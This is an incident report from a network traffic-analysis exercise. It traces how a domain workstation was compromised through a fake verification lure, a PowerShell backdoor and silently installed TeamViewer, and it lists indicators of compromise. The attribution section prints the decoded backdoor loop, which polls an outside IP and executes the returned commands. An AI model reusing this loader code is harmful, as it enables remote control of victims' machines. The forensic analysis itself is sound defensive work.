# Incident Report — 2025-01-22 Traffic Analysis Exercise

## Victim Host

| Field | Value | Evidence |
|---|---|---|
| IPv4 | 10.1.17.215 | Source of all suspicious traffic; consistent host across ARP, DHCP, NBNS, Kerberos |
| MAC address | 00:d0:b7:26:4a:74 | `arp.src.proto_ipv4==10.1.17.215` and `eth.src` for all frames sourced from 10.1.17.215; matches DHCP `dhcp.hw.mac_addr` for the DHCPDISCOVER/REQUEST from hostname DESKTOP-L8C5GSJ |
| Windows hostname | DESKTOP-L8C5GSJ | DHCP option 12 hostname; NBNS `DESKTOP-L8C5GSJ<00>`/`<20>` registered from 10.1.17.215; matching DNS queries for `DESKTOP-L8C5GSJ` and `DESKTOP-L8C5GSJ.bluemoontuesday.com` |
| Logged-in domain user | shutchenson (domain BLUEMOONTUESDAY) | Kerberos `CNameString` = `shutchenson` on TGT/TGS exchanges sourced from and destined to 10.1.17.215 (machine account `desktop-l8c5gsj$` also present, as expected for computer-account Kerberos traffic) |

Domain controller for context: 10.1.17.2 / WIN-GSH54QLW48D.bluemoontuesday.com (benign, AD/LDAP/Kerberos traffic only).

## Malware Family / Attribution

**Behavioral attribution: ClickFix-style fake-verification lure → PowerShell dropper → persistent PowerShell backdoor + abused (silently installed) TeamViewer for hands-on-keyboard remote access.**

No IDS/Suricata alert export was present in the evidence directory (only the pcap was supplied), so there is no signature-based family name to cite. Attribution here is derived entirely from observed behavior:

- The victim resolved `google-authenticator.burleson-appliance.net` and `authenticatoor.org` within about a second of each other (t≈38.2–38.9s), immediately after `appointedtimeagriculture.com` traffic — domain names consistent with a fake "verify you are human / Google Authenticator" ClickFix-style lure page that instructs the victim to paste and run a command via the Windows Run dialog.
- Shortly after (t≈60s onward, over HTTP to bare-IP host `5.252.153.241`), the host downloaded PowerShell scripts (`pas.ps1`, `29842.ps1`) and TeamViewer binaries (`TeamViewer`, `TV`, `Teamviewer_Resource_fr`) using the request path pattern `/api/file/get-file/<name>`, from a server that identifies itself as `X-Powered-By: Express` (a Node.js file-serving/C2 panel).
- I decoded the obfuscated payload embedded in `pas.ps1`/`29842.ps1` (`Invoke-Expression` of a Base64 blob wrapped in string-splitting obfuscation using junk characters `#`, `;`, `{`/`}`, `>`). The decoded PowerShell is a persistent polling backdoor:
  ```powershell
  $fso = New-Object -Com "Scripting.FileSystemObject"
  $SerialNumber = $fso.GetDrive("c:\").SerialNumber
  $SerialNumber = "{0:X}" -f $SerialNumber
  $SerialNumber = [convert]::toint64($SerialNumber,16)
  $serial = $SerialNumber
  $ip = 'http://5.252.153.241/'
  $url = $ip+$serial
  $s = New-Object System.Net.WebClient
  while ($true) {
      try { $result=$s.DownloadString($url) } catch { Start-Sleep -s 5; continue }
      Invoke-Expression $result
      Start-Sleep -s 5
  }
  ```
  This uses the C: drive volume serial number as a per-victim bot ID and polls `http://5.252.153.241/<bot-id>` every 5 seconds, executing whatever the server returns via `Invoke-Expression`. This matches the observed beacon `GET /1517096937` (584 requests over the capture, 404 in almost every case, 10 returned HTTP 200 — meaning the operator issued live commands at least 10 times).
- The victim also sent status callbacks to the same server confirming successful staging: `GET /1517096937?k=message = startup shortcut created;  status = success;` and `GET /1517096937?k=script: RunRH, status: OK, message: PS process started` — i.e., the loader installed persistence (a startup shortcut) and confirmed the PowerShell backdoor process launched.
- All HTTP requests to the C2 use `User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; ...)`, the default User-Agent string emitted by .NET `System.Net.WebClient`, consistent with a PowerShell-driven downloader rather than an actual browser.
- Following the TeamViewer file downloads, the host established an active TeamViewer session (DynGate protocol handshakes `din.aspx`/`dout.aspx` to `master16.teamviewer.com` at 185.188.32.26, plus keep-alive DNS to `ping3.dyngate.com` roughly every 7.6 seconds from t≈611s through the end of the capture at t≈3200s) and a long-lived, high-volume encrypted session to TeamViewer relay IPs 45.125.66.32 (10 MB over ~1721s) and 45.125.66.252, consistent with an attacker actively controlling the desktop over TeamViewer for roughly 47 minutes.

No unique family-identifying string (panel name, mutex, malware family self-identification) was observed in cleartext, and no IDS export was provided, so I am naming this a **generic ClickFix-delivered PowerShell backdoor combined with abused TeamViewer remote access**, not a named commodity RAT family — attribution is **behavioral, not signature-confirmed**.

## Indicators of Compromise

### C2 endpoints
| Type | Value | Evidence |
|---|---|---|
| c2_endpoint | 5.252.153.241:80 | Node.js/Express file server serving PowerShell dropper and TeamViewer components via `/api/file/get-file/<name>`; receives persistent backdoor beacon `GET /<C-drive-serial>` every ~5s (584 requests, 10× HTTP 200) |

### Malicious domains (delivery/lure chain)
| Type | Value | Evidence |
|---|---|---|
| domain | authenticatoor.org (→82.221.136.26) | TLS SNI + DNS query at t≈38.9s, immediately preceding infection chain; fake verification/ClickFix-style lure domain name |
| domain | google-authenticator.burleson-appliance.net (→104.21.x.x, Cloudflare) | TLS SNI + DNS query at t≈38.2s, fake "Google Authenticator" verification lure hostname |
| domain | appointedtimeagriculture.com (→217.70.186.109) | HTTPS traffic at t≈52.4s, immediately preceding the drive-by download from 5.252.153.241 at t≈60s; likely compromised/redirector site in the delivery chain |

### Malicious URLs
| Type | Value | Evidence |
|---|---|---|
| url | http://5.252.153.241/api/file/get-file/pas.ps1 | HTTP GET, tcp.stream 61; served obfuscated PowerShell backdoor loader |
| url | http://5.252.153.241/api/file/get-file/29842.ps1 | HTTP GET; identical obfuscated backdoor loader (secondary/duplicate delivery) |
| url | http://5.252.153.241/api/file/get-file/TeamViewer | HTTP GET; delivers TeamViewer main executable used for silent remote access |
| url | http://5.252.153.241/api/file/get-file/TV | HTTP GET; TeamViewer support component |
| url | http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr | HTTP GET; TeamViewer French language resource DLL |
| url | http://5.252.153.241/<C-drive-serial> (observed as `/1517096937`) | Persistent backdoor beacon/tasking channel, polled every ~5s per decoded pas.ps1 logic |

### Transferred files (SHA256, exported via `tshark --export-objects http`)
| Type | Value | Evidence |
|---|---|---|
| file_hash / file_name | pas.ps1 — a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e | Downloaded from 5.252.153.241; obfuscated PowerShell backdoor loader (decoded above) |
| file_hash / file_name | 29842.ps1 — b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded | Downloaded from 5.252.153.241; identical backdoor loader content to pas.ps1 |
| file_hash / file_name | TeamViewer — 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e | Downloaded from 5.252.153.241 (4,380,968 bytes) |
| file_hash / file_name | TV — 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 | Downloaded from 5.252.153.241 (12,920 bytes) |
| file_hash / file_name | Teamviewer_Resource_fr — 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 | Downloaded from 5.252.153.241 (668,968 bytes) |

### Abused legitimate infrastructure (context, not independently malicious, but part of the attacker's access channel)
- TeamViewer DynGate session establishment: 185.188.32.26 (master16.teamviewer.com), keep-alive to ping3.dyngate.com, beginning t≈611s, immediately after the TeamViewer binaries were staged.
- TeamViewer relay/router traffic: 45.125.66.32 and 45.125.66.252 — ~10 MB, ~1721s-long encrypted session consistent with live interactive remote control of the desktop.

## Benign Context (not indicators)
- Microsoft/Windows telemetry, Defender updates, Windows Update (download.windowsupdate.com, au.download.windowsupdate.com, *.prod.do.dsp.mp.microsoft.com, delivery-optimization array*.prod.do.dsp.mp.microsoft.com) and the downloaded `.cab`/`am_delta_patch_*.exe` — legitimate OS/AV update traffic.
- Bing, MSN, Office, Skype, login.microsoftonline.com/login.live.com, Azure telemetry (js.monitor.azure.com, settings-win.data.microsoft.com, v10/v20.events.data.microsoft.com) — standard Windows 10/11 enterprise background noise.
- Google (clients2.google.com, www.google.com, googleads.g.doubleclick.net), Facebook, LinkedIn ads pixel, Adobe DTM/demdex, LivePerson, Yahoo analytics, Vidyard, ownerIQ, 3lift, postrelease — ad-tech/analytics beacons from normal browsing.
- NTP traffic to pool.ntp.org, time.windows.com, time.cloudflare.com, etc. — clock sync.
- Internal AD/domain traffic: LDAP/Kerberos/DCE-RPC/SMB/NBNS/NBDGM/CLDAP to 10.1.17.2 (WIN-GSH54QLW48D) — normal domain-joined workstation activity, and the source of the victim hostname/user identification.
- SSDP/mDNS/LLMNR broadcast traffic (239.255.255.250, *.local) — local network discovery noise.
- NVIDIA GFE traffic (services.gfe.nvidia.com) — driver/software telemetry.

## Incident Summary

The Windows workstation DESKTOP-L8C5GSJ (10.1.17.215, MAC 00:d0:b7:26:4a:74), logged in as domain user `shutchenson`, was compromised via what the traffic shows to be a ClickFix-style fake human-verification lure (domains authenticatoor.org and google-authenticator.burleson-appliance.net, reached via appointedtimeagriculture.com). This led to a PowerShell-driven download from 5.252.153.241 of an obfuscated backdoor loader (`pas.ps1`/`29842.ps1`) that installs startup persistence and polls the same IP every 5 seconds for attacker-issued commands (identified via 584 beacon requests, 10 of which received live tasking), plus a silent installation of the TeamViewer remote-support client, which the attacker then used for roughly 47 minutes of live, hands-on-keyboard remote control of the desktop via TeamViewer's DynGate relay infrastructure.
